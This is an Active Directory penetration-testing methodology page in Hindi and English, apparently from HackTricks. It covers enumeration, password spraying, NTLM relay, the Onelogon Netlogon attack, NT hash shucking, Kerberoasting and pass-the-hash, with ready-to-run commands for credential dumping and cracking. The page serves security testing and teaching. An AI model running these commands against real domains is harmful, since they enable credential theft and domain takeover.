# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Basic overview

**Active Directory** एक मूलभूत technology के रूप में काम करता है, जो **network administrators** को **domains**, **users**, और **objects** को network में efficiently create और manage करने में सक्षम बनाता है। इसे scale करने के लिए engineered किया गया है, जिससे बड़ी संख्या में users को manageable **groups** और **subgroups** में organize करना आसान होता है, और साथ ही विभिन्न levels पर **access rights** को control किया जा सकता है।

**Active Directory** की structure तीन primary layers से बनी है: **domains**, **trees**, और **forests**। एक **domain** objects का एक collection होता है, जैसे **users** या **devices**, जो एक common database share करते हैं। **Trees** ऐसे domains के groups होते हैं जो एक shared structure से जुड़े होते हैं, और एक **forest** multiple trees का collection होता है, जो **trust relationships** के जरिए interconnected होते हैं, और organizational structure की सबसे ऊपरी layer बनाते हैं। हर level पर specific **access** और **communication rights** तय किए जा सकते हैं।

**Active Directory** के भीतर key concepts शामिल हैं:

1. **Directory** – Active Directory objects से संबंधित सभी जानकारी को रखता है।
2. **Object** – directory के भीतर entities को दर्शाता है, जिनमें **users**, **groups**, या **shared folders** शामिल हैं।
3. **Domain** – directory objects के लिए एक container के रूप में काम करता है, और एक **forest** के भीतर multiple domains coexist कर सकते हैं, जिनमें से हर एक अपना object collection maintain करता है।
4. **Tree** – domains का एक grouping जो एक common root domain share करता है।
5. **Forest** – Active Directory में organizational structure का सर्वोच्च स्तर, जो कई trees से मिलकर बनता है और उनके बीच **trust relationships** होती हैं।

**Active Directory Domain Services (AD DS)** services की एक range को शामिल करता है जो network के भीतर centralized management और communication के लिए critical हैं। इन services में शामिल हैं:

1. **Domain Services** – data storage को centralize करता है और **users** तथा **domains** के बीच interactions को manage करता है, जिसमें **authentication** और **search** functionalities शामिल हैं।
2. **Certificate Services** – secure **digital certificates** के creation, distribution, और management की देखरेख करता है।
3. **Lightweight Directory Services** – **LDAP protocol** के जरिए directory-enabled applications को support करता है।
4. **Directory Federation Services** – एक ही session में multiple web applications के across users को authenticate करने के लिए **single-sign-on** capabilities प्रदान करता है।
5. **Rights Management** – copyright material को unauthorized distribution और use से बचाने में सहायता करता है।
6. **DNS Service** – **domain names** के resolution के लिए महत्वपूर्ण है।

अधिक विस्तृत explanation के लिए देखें: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

यह जानने के लिए कि **attack an AD** कैसे करें, आपको **Kerberos authentication process** को बहुत अच्छी तरह **understand** करना होगा।\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

आप तेज़ overview के लिए [https://wadcoms.github.io/](https://wadcoms.github.io) पर बहुत कुछ देख सकते हैं कि AD को enumerate/exploit करने के लिए आप कौन-कौन से commands चला सकते हैं।

> [!WARNING]
> Kerberos communication actions perform करने के लिए एक full qualifid name (FQDN) **requires** करती है। अगर आप machine को IP address से access करने की कोशिश करते हैं, तो **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

अगर आपके पास AD environment का access है लेकिन कोई credentials/sessions नहीं हैं, तो आप यह कर सकते हैं:

- **Pentest the network:**
- Network scan करें, machines और open ports ढूंढें, और **exploit vulnerabilities** या उनसे **credentials extract** करने की कोशिश करें (उदाहरण के लिए, [printers could be very interesting targets](ad-information-in-printers.md).
- DNS enumerate करने से domain में key servers, जैसे web, printers, shares, vpn, media, आदि, के बारे में जानकारी मिल सकती है।
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- और जानकारी के लिए General [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) देखें कि यह कैसे करना है।
- SMB services पर null और Guest access **Check** करें (यह modern Windows versions पर काम नहीं करेगा):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- SMB server को enumerate करने का अधिक detailed guide यहाँ मिल सकता है:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP को enumerate करने का अधिक detailed guide यहाँ मिल सकता है (anonymous access पर **special attention** दें):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Responder के साथ services को [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) करके credentials इकट्ठा करें
- host तक पहुँचें [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) का उपयोग करके
- [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) expose करके credentials इकट्ठा करें
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- internal documents, social media, services (mainly web) inside the domain environments, और publicly available sources से usernames/names निकालें।
- अगर आपको company workers के complete names मिलते हैं, तो आप अलग-अलग AD **username conventions (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)) try कर सकते हैं। सबसे common conventions हैं: _NameSurname_, _Name.Surname_, _NamSur_ (हर एक के 3 letters), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123)।
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) और [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) pages देखें।
- **Kerbrute enum**: जब कोई **invalid username is requested** किया जाता है, तो server **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ के साथ respond करेगा, जिससे हम पता लगा सकते हैं कि username invalid था। **Valid usernames** या तो **TGT in a AS-REP** response देंगे या error _KRB5KDC_ERR_PREAUTH_REQUIRED_ देंगे, जो बताता है कि user को pre-authentication करनी होगी।
- **No Authentication against MS-NRPC**: domain controllers पर MS-NRPC (Netlogon) interface के खिलाफ auth-level = 1 (No authentication) का उपयोग। यह method `DsrGetDcNameEx2` function को MS-NRPC interface bind करने के बाद call करता है ताकि यह जांच सके कि user या computer बिना किसी credentials के exists करता है या नहीं। [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) tool इस प्रकार की enumeration implement करता है। Research [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf) में मिल सकती है
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

यदि आपने नेटवर्क में इनमें से कोई सर्वर पाया है, तो आप इसके खिलाफ **user enumeration** भी कर सकते हैं। उदाहरण के लिए, आप टूल [**MailSniper**](https://github.com/dafthack/MailSniper) का उपयोग कर सकते हैं:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> आपको [**इस github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) और यह वाला ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) में usernames की lists मिल सकती हैं।
>
> हालांकि, इस step से पहले आपने जो recon step perform किया होगा, उससे आपको कंपनी में काम करने वाले लोगों के **नाम** होने चाहिए। name और surname के साथ आप script [**namemash.py**](https://gist.github.com/superkojiman/11076951) का use करके potential valid usernames generate कर सकते हैं।

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

**Zerologon** patch होने के बाद भी, DC पर explicitly allow-listed accounts अभी भी **legacy/vulnerable Netlogon secure-channel behavior** के exposure में रह सकती हैं। जोखिम भरी configuration GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** या matching registry value **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`** है।

यह value एक **SDDL security descriptor** है (देखें [Security Descriptors](security-descriptors.md))। DACL में relevant ACE दिए गए किसी भी account या group को target किया जा सकता है। उदाहरण के लिए, `O:BAG:BAD:(A;;RC;;;WD)` effectively **Everyone** को allow-list करता है।

Practical operator workflow:

1. **SYSVOL/GPO** और **live DC registry** दोनों की जांच करके allow-listed principals की पहचान करें।
2. SDDL में मिले **SIDs** को real AD users/computers में resolve करें और **DC machine accounts**, **trust accounts**, और अन्य privileged machines को प्राथमिकता दें।
3. allow-listed account के रूप में बार-बार **MS-NRPC / Netlogon authentication** attempt करें।
4. एक successful guess के बाद, target account password reset करने के लिए **Netlogon password-setting** abuse करें (public PoC इसे empty string पर set करता है)।

Public artifact से quick triage / lab examples:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
टिप्पणियाँ:

- **scanner** उपयोगी है क्योंकि effective allow-list **SYSVOL** में, **registry** में, या दोनों में मौजूद हो सकती है।
- exploit path खुद महत्वपूर्ण है क्योंकि vulnerable account की पहचान हो जाने के बाद इसे **Domain Admin privileges** की आवश्यकता नहीं होती।
- **Domain Controller machine account** जैसे `DC$` को compromise करना खास तौर पर खतरनाक है क्योंकि उस password को reset करने से सीधे broader **AD takeover** paths सक्षम हो सकते हैं।
- **Brute-force feasibility** mode पर निर्भर करती है: public artifact एक meet-in-the-middle approach, दूसरे computer account के उपलब्ध होने पर **24-bit** brute force, और धीमे **32-bit** variants का वर्णन करता है।

Detection / hardening notes:

- allow-list policy का audit करें और temporary, explicitly required compatibility exceptions के अलावा सब कुछ हटा दें।
- vulnerable Netlogon connections को denied, discovered, या policy द्वारा explicitly allowed के रूप में पकड़ने के लिए DC **System** events **5827/5828/5829/5830/5831** को monitor करें।
- legacy dependency हटने तक **VulnerableChannelAllowList** में मौजूद accounts को **high-risk** मानें।

### Knowing one or several usernames

ठीक है, तो आपको पता है कि आपके पास पहले से एक valid username है लेकिन passwords नहीं... फिर कोशिश करें:

- [**ASREPRoast**](asreproast.md): यदि किसी user के पास _DONT_REQ_PREAUTH_ attribute **नहीं** है, तो आप उस user के लिए **AS_REP message** request कर सकते हैं जिसमें password की derivation से encrypted कुछ data होगा।
- [**Password Spraying**](password-spraying.md): आइए discovered users के साथ सबसे **common passwords** आज़माएँ, शायद कोई user खराब password इस्तेमाल कर रहा हो (password policy याद रखें!).
- ध्यान दें कि आप users के mail servers तक access पाने के लिए **OWA servers** पर भी **spray** कर सकते हैं।


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

आप नेटवर्क के कुछ protocols को **poisoning** करके कुछ challenge **hashes** प्राप्त करने में सक्षम हो सकते हैं ताकि crack कर सकें:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

यदि आपने active directory को enumerate करने में सफलता पा ली है, तो आपके पास **more emails and a better understanding of the network** होगी। आप AD env तक access पाने के लिए NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) को force करने में सक्षम हो सकते हैं।

### NetExec workspace-driven recon & relay posture checks

- AD recon state को प्रति engagement संभालने के लिए **`nxcdb` workspaces** का उपयोग करें: `workspace create <name>` `~/.nxc/workspaces/<name>` के अंदर प्रति-protocol SQLite DBs (smb/mssql/winrm/ldap/etc) बनाता है। `proto smb|mssql|winrm` से views बदलें और `creds` से gathered secrets सूचीबद्ध करें। काम पूरा होने पर संवेदनशील data को manually purge करें: `rm -rf ~/.nxc/workspaces/<name>`.
- **`netexec smb <cidr>`** के साथ quick subnet discovery **domain**, **OS build**, **SMB signing requirements**, और **Null Auth** दिखाता है। `(signing:False)` दिखाने वाले members **relay-prone** होते हैं, जबकि DCs अक्सर signing require करते हैं।
- targeting आसान बनाने के लिए NetExec output से सीधे **/etc/hosts** में **hostnames** generate करें:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- जब **SMB relay to the DC** signing के कारण blocked हो, तब भी **LDAP** posture probe करें: `netexec ldap <dc>` `(signing:None)` / weak channel binding को highlight करता है। एक DC जिसमें SMB signing required है लेकिन LDAP signing disabled है, वह अभी भी abuses जैसे **SPN-less RBCD** के लिए viable **relay-to-LDAP** target रहता है।

### Client-side printer credential leaks → bulk domain credential validation

- Printer/web UIs कभी-कभी **masked admin passwords को HTML में embed** करती हैं। source/devtools देखने पर cleartext मिल सकता है (जैसे, `<input value="<password>">`), जिससे scan/print repositories तक Basic-auth access मिल जाता है।
- Retrieved print jobs में **plaintext onboarding docs** हो सकते हैं जिनमें per-user passwords हों। testing के दौरान pairings को aligned रखें:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### NTLM Creds चुराना

अगर आप **other PCs या shares** को **null या guest user** के साथ **access** कर सकते हैं, तो आप **files** (जैसे SCF file) **place** कर सकते हैं जो अगर किसी तरह accessed हों तो आपके खिलाफ **NTLM authentication trigger** करेंगे, ताकि आप **NTLM challenge** को **steal** करके उसे crack कर सकें:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** हर उस NT hash को, जो आपके पास पहले से है, एक candidate password की तरह treat करता है, उन दूसरे, slower formats के लिए जिनका key material सीधे NT hash से derive होता है। Kerberos RC4 tickets, NetNTLM challenges, या cached credentials में लंबे passphrases को brute-force करने के बजाय, आप NT hashes को Hashcat के NT-candidate modes में feed करते हैं और plaintext जाने बिना password reuse validate करते हैं। यह खास तौर पर domain compromise के बाद potent होता है, जब आप हजारों current और historical NT hashes harvest कर सकते हैं।

Shucking का उपयोग तब करें जब:

- आपके पास DCSync, SAM/SECURITY dumps, या credential vaults से NT corpus हो और आपको दूसरे domains/forests में reuse test करना हो।
- आप RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, या DCC/DCC2 blobs capture करते हैं।
- आप लंबे, uncrackable passphrases के लिए reuse जल्दी साबित करना चाहते हैं और तुरंत Pass-the-Hash के जरिए pivot करना चाहते हैं।

यह technique उन encryption types के खिलाफ **काम नहीं करती** जिनकी keys NT hash नहीं होतीं (जैसे Kerberos etype 17/18 AES)। अगर कोई domain AES-only enforce करता है, तो आपको regular password modes पर लौटना होगा।

#### NT hash corpus बनाना

- **DCSync/NTDS** – `secretsdump.py` को history के साथ use करें ताकि संभव हो सके उतने NT hashes (और उनके previous values) grab किए जा सकें:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries candidate pool को बहुत बढ़ा देती हैं क्योंकि Microsoft प्रति account 24 previous hashes तक store कर सकता है। NTDS secrets harvest करने के और तरीके के लिए देखें:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (या Mimikatz `lsadump::sam /patch`) local SAM/SECURITY data और cached domain logons (DCC/DCC2) निकालता है। इन hashes को deduplicate करके उसी `nt_candidates.txt` list में append करें।
- **Metadata track करें** – हर hash किस username/domain से आया, यह keep करें (भले ही wordlist में सिर्फ hex हो)। Matching hashes आपको तुरंत बताते हैं कि Hashcat winning candidate print करते ही कौन सा principal password reuse कर रहा है।
- उसी forest या trusted forest से आए candidates को prefer करें; इससे shucking के दौरान overlap की chance अधिकतम होती है।

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Rule engines disable करें (no `-r`, no hybrid modes) क्योंकि mangling candidate key material को corrupt कर देता है।
- ये modes inherently faster नहीं हैं, लेकिन NTLM keyspace (~30,000 MH/s on an M3 Max) Kerberos RC4 (~300 MH/s) से ~100× तेज है। एक curated NT list test करना slow format में पूरे password space को explore करने से कहीं cheaper है।
- हमेशा **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) चलाएँ क्योंकि modes 31500/31600/35300/35400 हाल ही में shipped हुए हैं।
- अभी AS-REQ Pre-Auth के लिए कोई NT mode नहीं है, और AES etypes (19600/19700) के लिए plaintext password चाहिए क्योंकि उनकी keys PBKDF2 के जरिए UTF-16LE passwords से derive होती हैं, raw NT hashes से नहीं।

#### Example – Kerberoast RC4 (mode 35300)

1. Low-privileged user के साथ target SPN के लिए RC4 TGS capture करें (details के लिए Kerberoast page देखें):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Ticket को अपनी NT list के साथ shuck करें:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat हर NT candidate से RC4 key derive करता है और `$krb5tgs$23$...` blob validate करता है। Match होने का मतलब है कि service account आपके existing NT hashes में से एक use कर रहा है।

3. तुरंत PtH के जरिए pivot करें:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

जरूरत होने पर आप बाद में plaintext को `hashcat -m 1000 <matched_hash> wordlists/` से recover कर सकते हैं।

#### Example – Cached credentials (mode 31600)

1. Compromised workstation से cached logons dump करें:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. दिलचस्प domain user के लिए DCC2 line को `dcc2_highpriv.txt` में copy करें और shuck करें:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Successful match से आपके list में पहले से known NT hash मिल जाता है, जिससे साबित होता है कि cached user password reuse कर रहा है। इसे सीधे PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) के लिए use करें या तेज NTLM mode में brute-force करके string recover करें।

यही exact workflow NetNTLM challenge-responses (`-m 27000/27100`) और DCC (`-m 31500`) पर भी लागू होता है। Match identify हो जाने के बाद आप relay, SMB/WMI/WinRM PtH चला सकते हैं, या NT hash को masks/rules के साथ offline re-crack कर सकते हैं।



## Credentials/session के साथ Active Directory enumerate करना

इस phase के लिए आपके पास **compromised credentials या valid domain account की session** होनी चाहिए। अगर आपके पास कुछ valid credentials हैं या domain user के रूप में shell है, तो **यह याद रखें कि पहले दिए गए options अभी भी दूसरे users compromise करने के लिए उपलब्ध हैं**।

Authenticated enumeration शुरू करने से पहले आपको **Kerberos double hop problem** क्या है, यह जानना चाहिए।


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

किसी account को compromise करना **पूरे domain को compromise करने की शुरुआत** के लिए एक **बड़ा कदम** है, क्योंकि इससे आप **Active Directory Enumeration** शुरू कर पाएँगे:

[**ASREPRoast**](asreproast.md) के संबंध में अब आप हर संभव vulnerable user ढूँढ सकते हैं, और [**Password Spraying**](password-spraying.md) के संबंध में आप **सभी usernames की list** प्राप्त कर सकते हैं और compromised account का password, खाली passwords और नए promising passwords आज़मा सकते हैं।

- आप [**basic recon करने के लिए CMD**](../basic-cmd-for-pentesters.md#domain-info) use कर सकते हैं
- आप [**recon के लिए powershell**](../basic-powershell-for-pentesters/index.html) भी use कर सकते हैं, जो ज़्यादा stealthy होगा
- आप और detailed information निकालने के लिए [**powerview**](../basic-powershell-for-pentesters/powerview.md) भी use कर सकते हैं
- Active directory में recon के लिए एक और amazing tool है [**BloodHound**](bloodhound.md). यह **बहुत stealthy नहीं** है (आपके use किए गए collection methods पर निर्भर करता है), लेकिन **अगर आपको इसकी परवाह नहीं है**, तो आपको इसे ज़रूर try करना चाहिए। देखें users कहाँ RDP कर सकते हैं, दूसरे groups तक जाने का path खोजें, आदि।
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**AD के DNS records**](ad-dns-records.md) क्योंकि इनमें interesting information हो सकती है।
- **GUI वाला tool** जिससे आप directory enumerate कर सकते हैं वह **SysInternal** Suite का **AdExplorer.exe** है।
- आप **ldapsearch** से LDAP database में credentials ढूँढने के लिए _userPassword_ & _unixUserPassword_ fields, या यहाँ तक कि _Description_ भी search कर सकते हैं। अन्य methods के लिए cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment).
- अगर आप **Linux** use कर रहे हैं, तो आप [**pywerview**](https://github.com/the-useless-one/pywerview) से भी domain enumerate कर सकते हैं।
- आप automated tools भी try कर सकते हैं जैसे:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **सभी domain users extract करना**

Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`) से सभी domain usernames प्राप्त करना बहुत आसान है। Linux में, आप use कर सकते हैं: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> भले ही यह Enumeration section छोटा लगे, यह सबसे महत्वपूर्ण हिस्सा है। Links खोलें (mainly cmd, powershell, powerview और BloodHound वाले), domain enumerate करना सीखें और तब तक practice करें जब तक आप comfortable न हो जाएँ। Assessment के दौरान, यही वह key moment होगा जहाँ से आप DA तक पहुँचने का रास्ता खोजेंगे या तय करेंगे कि अब कुछ नहीं किया जा सकता।

### Kerberoast

Kerberoasting में **TGS tickets** हासिल करना शामिल है जो user accounts से जुड़े services द्वारा use किए जाते हैं और उनकी encryption को crack करना शामिल है—जो user passwords पर based होती है—**offline**।

इसके बारे में और जानकारी यहाँ:

{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

जब आपके पास कुछ credentials आ जाएँ, तो आप जाँच सकते हैं कि क्या आपकी किसी **machine** तक access है। इसके लिए आप **CrackMapExec** का use करके अपने ports scans के अनुसार कई servers पर different protocols के साथ connect करने की कोशिश कर सकते हैं।

### Local Privilege Escalation

अगर आपने credentials या regular domain user की session compromise कर ली है और आपके पास इस user के साथ domain की **किसी भी machine** पर **access** है, तो आपको locally privileges **escalate** करने और credentials के लिए looting करने का रास्ता ढूँढना चाहिए। ऐसा इसलिए है क्योंकि केवल local administrator privileges के साथ ही आप memory (LSASS) और locally (SAM) में **other users के hashes dump** कर पाएँगे।

इस book में [**Windows में local privilege escalation**](../windows-local-privilege-escalation/index.html) और एक [**checklist**](../checklist-windows-privilege-escalation.md) पर पूरी page है। साथ ही, [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) use करना न भूलें।

### Current Session Tickets

यह बहुत **unlikely** है कि आपको current user में **tickets** मिलेंगे जो आपको unexpected resources access करने की permission दें, लेकिन आप जाँच सकते हैं:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

यदि आपने active directory को enumerate कर लिया है, तो आपके पास **ज़्यादा emails और network की बेहतर समझ** होगी। आप NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) को force करने में सक्षम हो सकते हैं।**

### कंप्यूटर shares | SMB Shares में Creds ढूँढता है

अब जब आपके पास कुछ basic credentials हैं, आपको जाँच करनी चाहिए कि क्या आप AD के अंदर shared कोई **interesting files** **find** कर सकते हैं। आप इसे manually कर सकते हैं, लेकिन यह बहुत boring repetitive task है (और भी ज़्यादा अगर आपको hundreds of docs मिलें जिन्हें check करना हो)।

[**उन tools के बारे में जानने के लिए इस link को follow करें जिनका आप उपयोग कर सकते हैं।**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### NTLM Creds Steal करें

यदि आप दूसरे PCs या shares तक **access** कर सकते हैं, तो आप **files place** कर सकते हैं (जैसे SCF file) जो, अगर किसी तरह access हुई, तो आपके against t**rigger an NTLM authentication** करेगी, ताकि आप **NTLM challenge steal** करके उसे crack कर सकें:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

इस vulnerability ने किसी भी authenticated user को **domain controller compromise** करने की अनुमति दी।


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**निम्न techniques के लिए एक regular domain user पर्याप्त नहीं है, इन attacks को perform करने के लिए आपको कुछ special privileges/credentials चाहिए।**

### Hash extraction

उम्मीद है कि आपने [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html) का उपयोग करके किसी **local admin** account को **compromise** कर लिया होगा।\
फिर, अब समय है memory और locally में मौजूद सभी hashes को dump करने का।\
[**Hashes प्राप्त करने के विभिन्न तरीकों के बारे में इस page को पढ़ें।**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**एक बार जब आपके पास किसी user का hash हो**, तो आप इसका उपयोग उसे **impersonate** करने के लिए कर सकते हैं।\
आपको ऐसा **tool** उपयोग करना होगा जो उस **hash** का उपयोग करके **NTLM authentication perform** करे, **या** आप एक नया **sessionlogon** बना सकते हैं और उस **hash** को **LSASS** के अंदर **inject** कर सकते हैं, ताकि जब भी कोई **NTLM authentication** perform हो, वह **hash** उपयोग किया जाए। आखिरी option वही है जो mimikatz करता है।\
[**अधिक जानकारी के लिए इस page को पढ़ें।**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

यह attack user के NTLM hash का उपयोग करके Kerberos tickets request करने का लक्ष्य रखता है, जो NTLM protocol पर सामान्य Pass The Hash का एक alternative है। इसलिए, यह खास तौर पर **उन networks में useful** हो सकता है जहाँ NTLM protocol disabled है और authentication protocol के रूप में केवल **Kerberos allowed** है।


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

**Pass The Ticket (PTT)** attack method में, attackers password या hash values के बजाय **user का authentication ticket steal** करते हैं। फिर इस stolen ticket का उपयोग **user को impersonate** करने के लिए किया जाता है, जिससे network के अंदर resources और services तक unauthorized access मिलता है।


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

यदि आपके पास किसी **local administrator** का **hash** या **password** है, तो आपको इसके साथ दूसरे **PCs** में **locally login** करने की कोशिश करनी चाहिए।
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
